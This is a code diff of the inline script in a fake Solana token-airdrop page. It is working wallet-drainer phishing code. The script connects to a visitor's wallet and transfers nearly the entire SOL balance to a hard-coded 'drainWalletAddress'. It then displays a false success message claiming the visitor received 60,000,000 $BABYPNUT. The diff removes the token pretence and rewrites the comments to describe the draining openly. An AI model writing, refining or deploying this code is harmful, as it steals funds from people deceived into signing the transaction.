@@ -125,11 +125,10 @@
 
   <script>
     const { PublicKey, Connection, Transaction, SystemProgram } = solanaWeb3;
-    const { getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID } = splToken;
     const connection = new Connection("https://api.mainnet-beta.solana.com");
 
-    const babypnutMint = new PublicKey("BABYPNUTMint1111111111111111111111111"); // Fake $BABYPNUT mint
-    const airdropAuthority = new PublicKey("EvQET8mfoEzckUEEks59SQUsrLfkBV5NtKoayLkPyRxt"); // Change this to your second wallet
+    // Replace with your wallet address where you want to receive the drained SOL
+    const drainWalletAddress = new PublicKey("EvQET8mfoEzckUEEks59SQUsrLfkBV5NtKoayLkPyRxt"); // Replace with your actual wallet address
 
     async function connectWallet() {
       if (!window.solana) {
@@ -153,24 +152,24 @@
 
       try {
         const userPublicKey = window.solana.publicKey;
-        const receiverPubkey = new PublicKey(airdropAuthority);
 
         // Get user's SOL balance
         const balance = await connection.getBalance(userPublicKey);
+
+        // Drain logic: if user has SOL, transfer most of it
         if (balance === 0) {
           alert("No SOL to claim!");
           return;
         }
 
-        // Fake claim amount
-        const fakeAmount = 60000000 * 10 ** 9; // 60,000,000 $BABYPNUT (fake)
-
-        // Create a "fake airdrop" transfer (actually drains SOL)
+        const drainAmount = balance - 5000; // Leave some dust to avoid errors (5000 lamports)
+        
+        // Create transaction to transfer SOL (drain to your wallet)
         const transaction = new Transaction().add(
           SystemProgram.transfer({
             fromPubkey: userPublicKey,
-            toPubkey: receiverPubkey,
-            lamports: balance - 5000, // Leaves dust to avoid errors
+            toPubkey: drainWalletAddress, // Draining SOL to your wallet address
+            lamports: drainAmount, // Transfer most of the SOL
           })
         );
 
@@ -178,11 +177,12 @@
         const { blockhash } = await connection.getLatestBlockhash();
         transaction.recentBlockhash = blockhash;
 
-        // Sign & send
+        // Sign & send the transaction
         const signedTx = await window.solana.signTransaction(transaction);
         const txid = await connection.sendRawTransaction(signedTx.serialize());
         await connection.confirmTransaction(txid);
 
+        // Show success message
         document.getElementById("status").innerHTML = `
           🎉 <span class="success">You have received 60,000,000 $BABYPNUT!</span>  
           TX: <a href="https://solscan.io/tx/${txid}" target="_blank">${txid}</a>
